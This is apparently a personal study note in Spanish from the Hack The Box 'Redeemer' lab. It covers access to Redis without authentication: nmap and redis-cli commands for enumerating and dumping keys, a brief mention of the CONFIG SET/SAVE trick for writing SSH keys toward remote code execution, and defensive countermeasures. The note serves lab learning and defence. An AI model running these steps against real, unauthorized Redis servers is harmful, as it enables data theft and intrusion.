---
tags:
  - tecnica
  - categoria/initial-access
  - categoria/collection
  - os/linux
  - nivel/basico
fecha_aprendida: 2026-06-23
fuente: HTB/Redeemer
mitre_technique: T1190
---
# ⚔️ Redis Sin Autenticación

> [!abstract] Resumen
> Conexión directa a una instancia Redis expuesta sin `requirepass` configurado. Acceso total de lectura/escritura a todas las estructuras de datos almacenadas, sin credenciales.

---

## ¿Qué es y por qué funciona?

Redis es un almacén clave-valor en memoria diseñado originalmente para operar en redes internas confiables — por defecto no requiere autenticación (`requirepass` vacío) y suele bindear a `0.0.0.0` si no se configura explícitamente. Si se expone a una red no confiable sin estos ajustes, cualquier cliente puede conectarse con `redis-cli` y ejecutar comandos administrativos completos: leer datos, escribir, e incluso en versiones antiguas escribir archivos arbitrarios en disco (vector a RCE vía cron/SSH keys, no cubierto en esta máquina).

---

## Condiciones necesarias para que aplique

> [!warning] Requisitos
> - Puerto 6379/TCP accesible desde la red del atacante
> - `requirepass` no configurado en `redis.conf`
> - `bind` no restringido a localhost (o firewall no compensa la falta de auth)

---

## Procedimiento

### Detección / Enumeración

```bash
nmap -sCV -p 6379 <IP>
# Confirma versión de Redis en el banner

redis-cli -h <IP>
> PING
# PONG sin pedir AUTH = sin autenticación requerida
```

### Explotación

```bash
redis-cli -h <IP>

# Ver qué bases de datos existen y cuántas keys tienen
> INFO keyspace

# Seleccionar base de datos (Redis soporta múltiples DBs numeradas 0-15 por defecto)
> SELECT 0

# Listar todas las keys
> KEYS *

# Leer el valor de una key
> GET <nombre_key>
```

> [!tip] Variaciones comunes
> - Si hay múltiples DBs (`db0`, `db1`...), repetir `SELECT n` + `KEYS *` en cada una
> - Versiones antiguas de Redis permiten `CONFIG SET dir` + `CONFIG SET dbfilename` + `SAVE` para escribir archivos arbitrarios (ej. SSH authorized_keys) → vector a RCE, no explotado en Redeemer (Tier 0)
> - `redis-cli --scan` es preferible a `KEYS *` en producción real (KEYS bloquea el server con datasets grandes)

---

## Herramientas asociadas

| Herramienta | Función | Comando base |
| ----------- | ------- | ------------ |
| redis-cli | Cliente oficial de Redis | `redis-cli -h <IP>` |
| nmap (script redis-info) | Fingerprint de versión y config | `nmap -p 6379 --script redis-info <IP>` |

---

## Contramedidas (defensa)

> [!info] ¿Cómo se previene?
> Configurar `requirepass` con contraseña fuerte en `redis.conf`. Bindear a `127.0.0.1` o red interna únicamente (`bind 127.0.0.1`). Firewall: bloquear 6379 desde Internet. Habilitar Redis ACLs (Redis 6+) para limitar comandos por usuario. Monitorear conexiones entrantes al puerto 6379 desde IPs no autorizadas.

---

## Dónde la usé

- `[[HTB/Redeemer/Redeemer]]` — Acceso sin auth, extracción de flag desde `KEYS *` / `GET`

---

## Referencias

- [HackTricks - Redis](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis)
- [Redis Security Docs](https://redis.io/docs/management/security/)
- [MITRE ATT&CK - T1190](https://attack.mitre.org/techniques/T1190/)
